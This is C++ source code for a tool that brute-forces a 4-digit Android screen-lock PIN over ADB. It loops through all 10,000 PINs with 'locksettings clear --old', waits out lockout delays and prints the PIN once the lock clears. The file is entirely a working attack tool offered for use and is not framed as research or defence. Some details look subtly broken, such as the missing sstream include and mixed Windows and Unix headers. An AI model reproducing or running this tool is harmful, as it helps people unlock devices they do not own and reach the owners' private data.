
#include <iostream>
#include <iomanip>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>

#include <Windows.h>
#include <unistd.h>
#include <cstdlib>

using namespace std;

string exec(const char *cmd);
string getOsName();

int main()
{
    string os = getOsName();
    string path;
    if (os == "Windows 32-bit" || os == "Windows 64-bit")
    {
        path = "windows\\";
    }
    else if (os == "Linux" || os == "Mac OSX" || os == "Unix")
    {
        path = "linux/";
    }
    else
    {
        cerr << "[!] - Don't support you os" << endl;
        system("pause");
        return 0;
    }

    cout << "[+] - Please wait 1 hour and 30 minutes maximum for guess password ..." << endl;

    for (int i = 0; i < 10000; i++)
    {
        string command = path + "adb.exe shell locksettings clear --old ";
        stringstream ss;
        ss << setw(4) << setfill('0') << i;
        string rpassword = ss.str();

        command += rpassword;

        string result = exec(command.c_str());
        cout << result << endl;
        cout << (result.find("user has no password") != string::npos) << endl;

        if (result.empty())
        {
            cerr << "[!] - No devices/emulators found " << endl;
            system("pause");
            return 0;
        }

        if (result.find("Lock credential cleared") != string::npos || result.find("user has no password") != string::npos)
        {
            cout << "[+] - Password has been found : " + rpassword << endl;
            system("pause");
            return 1;
        }

        cout << "[+] - Try password : " + rpassword << endl;

        if (i == 4 || i == 9)
        {
            cout << "[+] - wait 30 second ..." << endl;
            sleep(30);
        }
        else if (i > 9)
        {
            if (i > 40)
            {
                cout << "[+] - wait 60 second ..." << endl;
                sleep(60);
            }
            else
            {
                cout << "[+] - wait 30 second ..." << endl;
                sleep(30);
            }
        }
    }
}
// Lock credential cleared
// Old password '2002' didn't match
string exec(const char *cmd)
{
    char buffer[128];
    string result = "";
    FILE *pipe = popen(cmd, "r");
    if (!pipe)
        throw runtime_error("popen() failed!");
    try
    {
        while (fgets(buffer, sizeof buffer, pipe) != NULL)
        {
            result += buffer;
        }
    }
    catch (...)
    {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

string getOsName()
{
#ifdef _WIN32
    return "Windows 32-bit";
#elif _WIN64
    return "Windows 64-bit";
#elif __APPLE__ || __MACH__
    return "Mac OSX";
#elif __linux__
    return "Linux";
#elif __FreeBSD__
    return "FreeBSD";
#elif __unix || __unix__
    return "Unix";
#else
    return "Other";
#endif
}
